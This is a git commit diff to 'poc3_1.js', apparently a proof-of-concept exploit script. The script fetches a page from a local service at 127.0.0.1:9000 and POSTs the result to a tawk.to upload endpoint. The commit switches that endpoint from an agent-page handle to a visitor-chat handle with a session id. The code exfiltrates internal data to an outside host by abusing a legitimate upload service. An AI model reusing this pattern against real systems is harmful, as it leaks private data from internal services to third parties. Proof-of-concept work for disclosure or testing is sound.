1fdd4b11bd455dea55ea7c2a9d12a0dcd2ea014d
karvashy <98531740+karvashy@users.noreply.github.com>
2022-03-03 20:36:19 +0530

    Update poc3_1.js

--- poc3_1.js
+++ poc3_1.js
@@ -17,7 +17,7 @@ fetch("http://127.0.0.1:9000/view/2ef5222a-5460-4b36-a154-7e4a8ff966b3").then((r
 
 formData.append("upload", file);
 
-fetch("https://upload.tawk.to/upload/page/agent?handle=bf90a7fad257ce61bf013fa4e15a9a9288eac54a&pageId=6220693e1ffac05b1d7cb5f1&agentSessionId=62206769694e920ad4a046da",{
+fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=76bfbfee4424fbb8b5e1d0e6379fa661f3da5a92&visitorSessionId=6220d0fe73923aaa6503b62a",{
         method: 'POST',
         body: formData
     });
